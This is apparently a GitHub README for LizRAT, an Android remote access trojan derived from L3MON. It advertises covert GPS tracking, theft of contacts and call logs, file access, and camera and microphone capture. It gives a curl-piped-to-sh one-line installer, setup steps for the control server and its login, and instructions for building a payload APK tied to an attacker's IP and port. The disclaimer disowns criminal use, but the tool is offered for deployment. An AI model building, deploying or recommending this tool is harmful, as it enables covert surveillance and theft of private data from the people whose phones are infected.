# LizRat-Termux:
This is a Android RAT tool inspired from L3MON. I Developed This tool to add some new features Like Camera Caputure & Recording.
I am NOT RESPONSIBLE if you use this tool to commit any crime.

# Featurs:
```bash
. GPS Logging
. Contacts Informations
. Call Logs
. File Manager
. Camera Acces (Both Front & Back)
. Mic Access
. Payload Builder removed
. Added New builder script written in Bash for both Termux & Linux.
. Now supports java 17. No need to install java 8
. one click installer
```

# Install in TERMUX! Copy and paste the below command and Grab a Coffee. (:
```bash
curl -s https://raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/install.sh | sh
```

# How to setup username & pwd: Same for both Termux & Linux/ubuntu/Debian
```bash
. After the instllation complete first start the server by typing 'liz' in TERMUX or by Typing "pm2 start index.js" in Linux & stop it by typing 'lizx' or "pm2 stop index.js", This will create a file 
  called 'maindb.json' in lizrat directory. which is in TERMUX '/usr/opt/lizrat'
. Now, Go to the lizrat directory and search for the file named "maindb.json".
. You have to edit this file to set 'username' & 'Password'.
. open that file with any editor and change the usernmae from 'admin' to whater you want like 'xyz'.
. Now, in password field first you have to first convert your password into 'md5hash' then you will have to paste it in that 
  file. Example:- if the password is 'admin' then convert it into 'md5hash' by going to any website like 
  https://www.md5hashgenerator.com/ Then copy that hash and paste it in the password field.
. Again restart the server by typing 'liz' to login with your new credentials.
```
# How to use Builder: Termux (Without Java 8)
```bash
. Type "lizb" anywhere to start building the payload. no need to start the server its totally offline.
. Type the IP & PORT and wait for the build to complete.
. after the built, apk can be found at home directory under lizrat_output
. "Lizrat_output" folder is not found then plz check if "apktool" is installed properly or not"
```
# How to use Builder: LINUX (Without Java 8)
```bash
. run 'builder_linux.sh' which is inside lizrat directory to start building the payload. no need to start the server its 
  totally offline.
. Type the IP & PORT and wait for the build to complete.
. after the built, apk can be found at home directory under /home/$USER/lizrat_output
. "Lizrat_output" folder is not found then plz check if "apktool" is installed properly or not by typing apktool"
```

# How To Use: Execute Commands Anywhere in Termux
```bash
. To Start the server type "liz"
. To build the payload type "lizb"
. To stop the server type "lizx"
```

# How to install in ubuntu/linux/Debian:
```bash
. Clone the Repository.
. Install Any java (java 8:Recommend)
. Install Nodejs & npm:
  apt-get install nodejs npm
. Install pm2 globaly(IMP):
  npm install pm2 -g
. cd to "lizrat" Directory and type "npm install" to install all the required bundle & wait for the npm installation to 
  complete
. Start Server: Type "pm2 start index.js" in lizrat directory.
. Stop Server: Type "Pm2 stop index.js" in lizrat directory
```
